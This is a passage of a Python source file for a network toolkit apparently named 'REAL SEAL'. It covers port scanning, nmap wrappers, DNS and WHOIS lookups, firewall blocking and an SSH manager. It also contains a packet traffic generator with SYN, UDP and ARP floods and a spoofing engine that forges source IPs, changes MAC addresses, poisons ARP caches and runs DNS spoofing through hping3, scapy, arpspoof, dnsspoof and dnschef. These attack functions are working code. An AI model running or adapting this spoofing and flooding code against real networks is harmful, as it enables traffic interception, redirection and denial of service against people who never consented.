                        response = sr1(packet, timeout=timeout, verbose=False)
                        if response is None:
                            return {'port': port, 'protocol': 'udp', 'state': 'open|filtered', 'service': 'unknown'}
                        elif response.haslayer(ICMP) and response.getlayer(ICMP).type == 3:
                            return {'port': port, 'state': 'closed'}
                        return {'port': port, 'state': 'open'}
                    except:
                        return {'port': port, 'state': 'error'}
                else:
                    # Fallback to TCP connect
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    sock.close()
                    
                    if result == 0:
                        service = NetworkTools._get_service_banner(target, port, timeout)
                        return {'port': port, 'protocol': 'tcp', 'state': 'open', 'service': service}
                    else:
                        return {'port': port, 'state': 'closed'}
                        
            except Exception as e:
                return {'port': port, 'state': 'error', 'error': str(e)}
            finally:
                scanned += 1
        
        # Use thread pool for faster scanning
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = list(executor.map(scan_port, port_list))
        
        for result in results:
            if result.get('state') == 'open':
                open_ports.append({'port': result['port'], 'protocol': result.get('protocol', 'tcp'),
                                  'service': result.get('service', 'unknown')})
                if result.get('service'):
                    service_info[result['port']] = result['service']
            elif result.get('state') == 'closed':
                closed_ports.append(result['port'])
            elif result.get('state') == 'filtered':
                filtered_ports.append(result['port'])
        
        scan_time = time.time() - start_time
        
        return {
            'success': True,
            'target': target,
            'scan_type': scan_type,
            'ports_scanned': total_ports,
            'open_ports': open_ports,
            'open_count': len(open_ports),
            'closed_ports': closed_ports,
            'filtered_ports': filtered_ports,
            'service_info': service_info,
            'scan_time': scan_time,
            'output': f"Scan completed in {scan_time:.2f}s. Found {len(open_ports)} open ports."
        }
    
    @staticmethod
    def _get_service_banner(target: str, port: int, timeout: float = 2.0) -> str:
        """Try to get service banner for open port"""
        common_services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 993: 'IMAPS',
            995: 'POP3S', 3306: 'MySQL', 5432: 'PostgreSQL', 27017: 'MongoDB'
        }
        
        if port in common_services:
            return common_services[port]
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            sock.send(b'\r\n')
            banner = sock.recv(256).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            if banner:
                # Try to identify service from banner
                banner_lower = banner.lower()
                if 'ssh' in banner_lower:
                    return 'SSH'
                elif 'ftp' in banner_lower:
                    return 'FTP'
                elif 'http' in banner_lower:
                    return 'HTTP'
                elif 'smtp' in banner_lower:
                    return 'SMTP'
                return banner[:50]
        except:
            pass
        
        return 'unknown'
    
    @staticmethod
    def nmap_scan(target: str, scan_type: str = "quick") -> Dict[str, Any]:
        """Run nmap scan with various options"""
        nmap_cmd = ['nmap']
        
        if scan_type == "quick":
            nmap_cmd.extend(['-T4', '-F', target])
        elif scan_type == "full":
            nmap_cmd.extend(['-p-', '-T4', target])
        elif scan_type == "stealth":
            nmap_cmd.extend(['-sS', '-T2', '--max-parallelism', '100', target])
        elif scan_type == "version":
            nmap_cmd.extend(['-sV', '-sC', '-T4', target])
        elif scan_type == "os":
            nmap_cmd.extend(['-O', '--osscan-guess', target])
        elif scan_type == "vuln":
            nmap_cmd.extend(['--script', 'vuln', target])
        else:
            nmap_cmd.extend(['-p', scan_type if scan_type.isdigit() else '1-1000', target])
        
        return NetworkTools.execute_command(nmap_cmd, timeout=300)
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30) -> Dict[str, Any]:
        """Trace network path to target"""
        if platform.system().lower() == 'windows':
            return NetworkTools.execute_command(['tracert', '-d', '-h', str(max_hops), target], timeout=60)
        else:
            return NetworkTools.execute_command(['traceroute', '-n', '-m', str(max_hops), target], timeout=60)
    
    @staticmethod
    def whois(target: str) -> Dict[str, Any]:
        """WHOIS lookup"""
        if not WHOIS_AVAILABLE:
            return {'success': False, 'output': 'WHOIS module not installed'}
        try:
            result = whois.whois(target)
            return {'success': True, 'output': str(result)}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def dns_lookup(target: str, record_type: str = "A") -> Dict[str, Any]:
        """DNS lookup with multiple record types"""
        if shutil.which('dig'):
            return NetworkTools.execute_command(['dig', target, record_type, '+short'], timeout=10)
        else:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(target, record_type)
                output = '\n'.join(str(answer) for answer in answers)
                return {'success': True, 'output': output}
            except ImportError:
                return NetworkTools.execute_command(['nslookup', target], timeout=10)
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        """Get geolocation information for IP"""
        try:
            # Try ip-api.com first (free, no API key)
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country', 'N/A'),
                        'country_code': data.get('countryCode', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'zip': data.get('zip', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'org': data.get('org', 'N/A'),
                        'as': data.get('as', 'N/A'),
                        'timezone': data.get('timezone', 'N/A')
                    }
        except:
            pass
        
        return {'success': False, 'error': 'Location lookup failed'}
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_public_ip() -> str:
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text.strip()
        except:
            try:
                response = requests.get('https://icanhazip.com', timeout=5)
                return response.text.strip()
            except:
                return "Unknown"
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        """Block IP using system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10, check=False)
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run([
                        'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                        f'name=REAL_SEAL_Block_{ip.replace(".", "_")}',
                        'dir=in', 'action=block', f'remoteip={ip}'
                    ], timeout=10, check=False)
                    return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        """Unblock IP from system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10, check=False)
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run([
                        'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                        f'name=REAL_SEAL_Block_{ip.replace(".", "_")}'
                    ], timeout=10, check=False)
                    return True
            return False
        except:
            return False
    
    @staticmethod
    def get_network_interfaces() -> List[Dict]:
        """Get all network interfaces with details"""
        interfaces = []
        try:
            addrs = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            
            for iface_name, iface_addrs in addrs.items():
                iface_info = {
                    'name': iface_name,
                    'is_up': stats.get(iface_name, {}).isup if iface_name in stats else False,
                    'speed': stats.get(iface_name, {}).speed if iface_name in stats else 0,
                    'mtu': stats.get(iface_name, {}).mtu if iface_name in stats else 1500,
                    'addresses': []
                }
                
                for addr in iface_addrs:
                    iface_info['addresses'].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
                
                interfaces.append(iface_info)
        except Exception as e:
            logger.error(f"Failed to get interfaces: {e}")
        
        return interfaces
    
    @staticmethod
    def shorten_url(url: str) -> str:
        """Shorten URL using TinyURL"""
        if not SHORTENER_AVAILABLE:
            return url
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        """Generate QR code with styling"""
        if not QRCODE_AVAILABLE:
            return False
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="#2aa9ff", back_color="#0a1128")
            img.save(filename)
            return True
        except:
            try:
                qr = qrcode.QRCode(version=1, box_size=10, border=5)
                qr.add_data(url)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                img.save(filename)
                return True
            except:
                return False

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """Complete SSH connection manager with terminal emulation"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections = {}
        self.shells = {}
        self.sftp_clients = {}
        self.paramiko_available = PARAMIKO_AVAILABLE
        
        if not self.paramiko_available:
            logger.warning("Paramiko not available. SSH features disabled.")
    
    def is_available(self) -> bool:
        return self.paramiko_available
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_path: str = None, port: int = 22, notes: str = "") -> Dict:
        if not self.paramiko_available:
            return {'success': False, 'error': 'SSH module not available'}
        
        try:
            conn_id = str(uuid.uuid4())[:8]
            if key_path and not os.path.exists(key_path):
                return {'success': False, 'error': f'Key file not found: {key_path}'}
            
            if self.db.add_ssh_connection(conn_id, name, host, port, username, password, key_path, notes):
                return {'success': True, 'conn_id': conn_id, 'message': f'SSH server "{name}" added successfully'}
            return {'success': False, 'error': 'Failed to save connection'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def connect(self, conn_id: str) -> Dict:
        if not self.paramiko_available:
            return {'success': False, 'error': 'SSH module not available'}
        
        if conn_id in self.connections:
            return {'success': True, 'message': 'Already connected'}
        
        conn = self.db.get_ssh_connection(conn_id)
        if not conn:
            return {'success': False, 'error': f'Connection {conn_id} not found'}
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn['host'],
                'port': conn['port'],
                'username': conn['username'],
                'timeout': 30
            }
            
            if conn.get('password'):
                connect_kwargs['password'] = conn['password']
            elif conn.get('key_path') and os.path.exists(conn['key_path']):
                connect_kwargs['key_filename'] = conn['key_path']
            else:
                return {'success': False, 'error': 'No authentication method available'}
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            self.db.update_ssh_status(conn_id, 'connected')
            
            return {'success': True, 'message': f'Connected to {conn["name"]} ({conn["host"]})'}
        except paramiko.AuthenticationException:
            return {'success': False, 'error': 'Authentication failed'}
        except paramiko.SSHException as e:
            return {'success': False, 'error': f'SSH error: {e}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def disconnect(self, conn_id: str = None):
        if conn_id:
            if conn_id in self.connections:
                try:
                    self.connections[conn_id].close()
                    del self.connections[conn_id]
                except:
                    pass
                if conn_id in self.shells:
                    try:
                        self.shells[conn_id].close()
                    except:
                        pass
                    del self.shells[conn_id]
                self.db.update_ssh_status(conn_id, 'disconnected')
        else:
            for cid in list(self.connections.keys()):
                self.disconnect(cid)
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> Dict:
        if conn_id not in self.connections:
            connect_result = self.connect(conn_id)
            if not connect_result['success']:
                return {'success': False, 'output': connect_result['error']}
        
        client = self.connections[conn_id]
        conn = self.db.get_ssh_connection(conn_id)
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            full_output = output + ('\n' + error if error else '')
            success = exit_code == 0
            
            self.db.log_ssh_command(conn_id, command, full_output, success, 0)
            
            return {
                'success': success,
                'output': full_output if full_output else 'Command executed (no output)',
                'exit_code': exit_code
            }
        except Exception as e:
            return {'success': False, 'output': f'Execution error: {e}'}
    
    def open_shell(self, conn_id: str) -> Dict:
        """Open interactive shell session"""
        if conn_id not in self.connections:
            connect_result = self.connect(conn_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result['error']}
        
        client = self.connections[conn_id]
        
        try:
            shell = client.invoke_shell()
            self.shells[conn_id] = shell
            return {'success': True, 'shell': shell}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def send_shell_command(self, conn_id: str, command: str) -> Dict:
        if conn_id not in self.shells:
            result = self.open_shell(conn_id)
            if not result['success']:
                return result
        
        shell = self.shells[conn_id]
        
        try:
            # Clear buffer
            while shell.recv_ready():
                shell.recv(1024)
            
            shell.send(command + '\n')
            time.sleep(0.5)
            
            output = ""
            while shell.recv_ready():
                output += shell.recv(1024).decode('utf-8', errors='ignore')
                time.sleep(0.1)
            
            return {'success': True, 'output': output}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def upload_file(self, conn_id: str, local_path: str, remote_path: str) -> Dict:
        if conn_id not in self.connections:
            connect_result = self.connect(conn_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result['error']}
        
        client = self.connections[conn_id]
        
        try:
            sftp = client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            return {'success': True, 'message': f'Uploaded {local_path} to {remote_path}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def download_file(self, conn_id: str, remote_path: str, local_path: str) -> Dict:
        if conn_id not in self.connections:
            connect_result = self.connect(conn_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result['error']}
        
        client = self.connections[conn_id]
        
        try:
            sftp = client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            return {'success': True, 'message': f'Downloaded {remote_path} to {local_path}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def list_files(self, conn_id: str, path: str = ".") -> Dict:
        if conn_id not in self.connections:
            connect_result = self.connect(conn_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result['error']}
        
        client = self.connections[conn_id]
        
        try:
            sftp = client.open_sftp()
            files = sftp.listdir_attr(path)
            sftp.close()
            
            file_list = []
            for f in files:
                file_list.append({
                    'name': f.filename,
                    'size': f.st_size,
                    'permissions': oct(f.st_mode)[-3:],
                    'modified': datetime.datetime.fromtimestamp(f.st_mtime).isoformat()
                })
            
            return {'success': True, 'files': file_list, 'count': len(file_list)}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_status(self) -> Dict:
        return {
            'connected_servers': list(self.connections.keys()),
            'active_shells': list(self.shells.keys()),
            'total_connections': len(self.connections)
        }
    
    def get_servers(self) -> List[Dict]:
        servers = self.db.get_ssh_connections()
        for server in servers:
            server['connected'] = server['id'] in self.connections
            server['shell_active'] = server['id'] in self.shells
        return servers

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGenerator:
    """Real network traffic generator with Scapy and raw sockets"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
        self.has_raw_socket = self._check_raw_socket()
    
    def _check_raw_socket(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except:
            return False
    
    def get_available_types(self) -> List[str]:
        types = ['tcp_connect', 'http_get', 'http_post', 'https', 'dns']
        if self.scapy_available:
            types.extend(['icmp', 'tcp_syn', 'tcp_ack', 'udp', 'arp'])
        return types
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int,
                        port: int = None, packet_rate: int = 100, executed_by: str = "system") -> Dict:
        if traffic_type not in self.get_available_types():
            return {'success': False, 'error': f'Invalid traffic type. Available: {self.get_available_types()}'}
        
        if duration > 300:
            return {'success': False, 'error': 'Duration cannot exceed 300 seconds'}
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        if port is None:
            port_map = {'http_get': 80, 'http_post': 80, 'https': 443, 'dns': 53, 'tcp_syn': 80, 'tcp_ack': 80, 'tcp_connect': 80, 'udp': 53}
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(target=self._run_generator,
                                 args=(generator_id, traffic_type, target_ip, port, duration, packet_rate, stop_event))
        thread.daemon = True
        thread.start()
        
        self.active_generators[generator_id] = {
            'type': traffic_type, 'target': target_ip, 'port': port,
            'duration': duration, 'rate': packet_rate, 'started': datetime.datetime.now().isoformat()
        }
        
        return {'success': True, 'generator_id': generator_id, 'message': f'Traffic generation started: {traffic_type} to {target_ip}'}
    
    def _run_generator(self, gen_id: str, traffic_type: str, target_ip: str, port: int,
                      duration: int, packet_rate: int, stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        generator_func = self._get_generator(traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                packet_size = generator_func(target_ip, port)
                if packet_size > 0:
                    packets_sent += 1
                    bytes_sent += packet_size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        status = "stopped" if stop_event.is_set() else "completed"
        self.db.log_traffic(traffic_type, target_ip, port, duration, packets_sent, bytes_sent, packet_rate, status)
        
        if gen_id in self.active_generators:
            del self.active_generators[gen_id]
        if gen_id in self.stop_events:
            del self.stop_events[gen_id]
    
    def _get_generator(self, traffic_type: str):
        generators = {
            'icmp': self._gen_icmp,
            'tcp_syn': self._gen_tcp_syn,
            'tcp_ack': self._gen_tcp_ack,
            'tcp_connect': self._gen_tcp_connect,
            'udp': self._gen_udp,
            'http_get': self._gen_http_get,
            'http_post': self._gen_http_post,
            'https': self._gen_https,
            'dns': self._gen_dns,
            'arp': self._gen_arp
        }
        return generators.get(traffic_type, self._gen_tcp_connect)
    
    def _gen_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return self._gen_ping_socket(target_ip)
        try:
            from scapy.all import IP, ICMP, send
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _gen_ping_socket(self, target_ip: str) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, 1)
            payload = b"REAL_SEAL_PING"
            checksum = self._calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, 1)
            packet = header + payload
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _gen_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _gen_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _gen_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: REAL_SEAL\r\n\r\n"
            sock.send(data.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _gen_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                from scapy.all import IP, UDP, send
                data = b"REAL_SEAL_TRAFFIC_" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"REAL_SEAL_TRAFFIC_" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except:
            return 0
    
    def _gen_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "REAL_SEAL"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _gen_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&source=real_seal"
            headers = {"User-Agent": "REAL_SEAL", "Content-Length": str(len(data))}
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _gen_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "REAL_SEAL"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 300
        except:
            return 0
    
    def _gen_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _gen_arp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import Ether, ARP, sendp
            local_mac = self._get_local_mac()
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _calculate_checksum(self, data: bytes) -> int:
        if len(data) % 2 != 0:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        return checksum
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        return [{'id': gid, **info} for gid, info in self.active_generators.items()]
    
    def get_traffic_help(self) -> str:
        return """
🚀 REAL SEAL - Traffic Generation Help

Available Traffic Types:
  icmp        - ICMP echo requests (ping)
  tcp_syn     - TCP SYN packets (half-open scan)
  tcp_ack     - TCP ACK packets
  tcp_connect - Full TCP connections
  udp         - UDP packets
  http_get    - HTTP GET requests
  http_post   - HTTP POST requests
  https       - HTTPS requests
  dns         - DNS queries
  arp         - ARP requests

Usage:
  generate_traffic <type> <ip> <duration> [port] [rate]

Examples:
  generate_traffic icmp 8.8.8.8 10
  generate_traffic tcp_syn 192.168.1.1 30 80
  generate_traffic http_get example.com 60 80 200
  generate_traffic dns 8.8.8.8 15 53

Note: Flood types require root/admin privileges
"""

# =====================
# SPOOFING ENGINE
# =====================
class SpoofingEngine:
    """IP, MAC, ARP, and DNS spoofing capabilities"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.active_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        
        if shutil.which('hping3'):
            try:
                cmd = ['hping3', '-S', '-a', spoofed_ip, '-p', '80', '-c', '10', target]
                exec_result = subprocess.run(cmd, capture_output=True, timeout=10)
                if exec_result.returncode == 0:
                    result.update({'success': True, 'output': f"IP spoofing with hping3: {original_ip} -> {spoofed_ip}", 'method': 'hping3'})
                    self.db.log_spoofing('ip', original_ip, spoofed_ip, target, interface, True, exec_result.stdout.decode())
                    return result
            except:
                pass
        
        if self.scapy_available:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80, flags='S')
                send(packet, verbose=False)
                result.update({'success': True, 'output': f"IP spoofing with Scapy: Sent SYN from {spoofed_ip} to {target}", 'method': 'scapy'})
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, interface, True, "Packet sent")
                return result
            except Exception as e:
                result['output'] = f"Scapy error: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, interface, False, result['output'])
        return result
    
    def spoof_mac(self, interface: str, new_mac: str) -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        original_mac = self._get_mac(interface)
        
        if not original_mac:
            return {'success': False, 'output': f'Interface {interface} not found'}
        
        if shutil.which('macchanger'):
            try:
                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], timeout=5)
                mac_result = subprocess.run(['sudo', 'macchanger', '--mac', new_mac, interface], capture_output=True, text=True, timeout=10)
                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], timeout=5)
                if mac_result.returncode == 0:
                    result.update({'success': True, 'output': mac_result.stdout, 'method': 'macchanger'})
                    self.db.log_spoofing('mac', original_mac, new_mac, interface, interface, True, mac_result.stdout)
                    return result
            except Exception as e:
                result['output'] = f"macchanger error: {e}"
        
        try:
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], timeout=5)
            cmd_result = subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'address', new_mac], capture_output=True, text=True, timeout=5)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], timeout=5)
            if cmd_result.returncode == 0:
                result.update({'success': True, 'output': f"MAC changed to {new_mac}", 'method': 'ip'})
                self.db.log_spoofing('mac', original_mac, new_mac, interface, interface, True, cmd_result.stdout)
                return result
        except Exception as e:
            result['output'] = f"ip method error: {e}"
        
        result['output'] = "MAC spoofing failed. Install macchanger or ensure root."
        self.db.log_spoofing('mac', original_mac, new_mac, interface, interface, False, result['output'])
        return result
    
    def _get_mac(self, interface: str) -> str:
        try:
            with open(f'/sys/class/net/{interface}/address', 'r') as f:
                return f.read().strip()
        except:
            try:
                result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True)
                import re
                match = re.search(r'link/ether\s+([0-9a-f:]+)', result.stdout)
                if match:
                    return match.group(1)
            except:
                pass
        return None
    
    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        
        if shutil.which('arpspoof'):
            try:
                spoof_id = f"arp_{target_ip}"
                cmd = ['sudo', 'arpspoof', '-i', interface, '-t', target_ip, spoof_ip]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.active_spoofs[spoof_id] = process
                result.update({'success': True, 'output': f"ARP spoofing started: {target_ip} <- {spoof_ip}", 'method': 'arpspoof'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, target_ip, interface, True, "Spoofing started")
                return result
            except Exception as e:
                result['output'] = f"arpspoof error: {e}"
        
        if self.scapy_available:
            try:
                from scapy.all import Ether, ARP, sendp
                local_mac = self._get_mac(interface)
                if not local_mac:
                    return {'success': False, 'output': 'Could not get local MAC'}
                
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
                sendp(packet, iface=interface, verbose=False)
                result.update({'success': True, 'output': f"ARP spoof packet sent to {target_ip}", 'method': 'scapy'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, target_ip, interface, True, "Packet sent")
                return result
            except Exception as e:
                result['output'] = f"Scapy ARP error: {e}"
        
        result['output'] = "ARP spoofing failed. Install dsniff (arpspoof) or scapy."
        self.db.log_spoofing('arp', target_ip, spoof_ip, target_ip, interface, False, result['output'])
        return result
    
    def dns_spoof(self, domain: str, fake_ip: str, interface: str = "eth0") -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        hosts_file = "/tmp/dnsspoof_hosts.txt"
        
        try:
            with open(hosts_file, 'w') as f:
                f.write(f"{fake_ip} {domain}\n{fake_ip} www.{domain}\n")
        except:
            pass
        
        if shutil.which('dnsspoof'):
            try:
                spoof_id = f"dns_{domain}"
                cmd = ['sudo', 'dnsspoof', '-i', interface, '-f', hosts_file]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.active_spoofs[spoof_id] = process
                result.update({'success': True, 'output': f"DNS spoofing started: {domain} -> {fake_ip}", 'method': 'dnsspoof'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, interface, True, "Spoofing started")
                return result
            except Exception as e:
                result['output'] = f"dnsspoof error: {e}"
        
        if shutil.which('dnschef'):
            try:
                spoof_id = f"dnschef_{domain}"
                cmd = ['dnschef', '--fakeip', fake_ip, '--fakedomains', domain, '-i', '0.0.0.0']
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.active_spoofs[spoof_id] = process
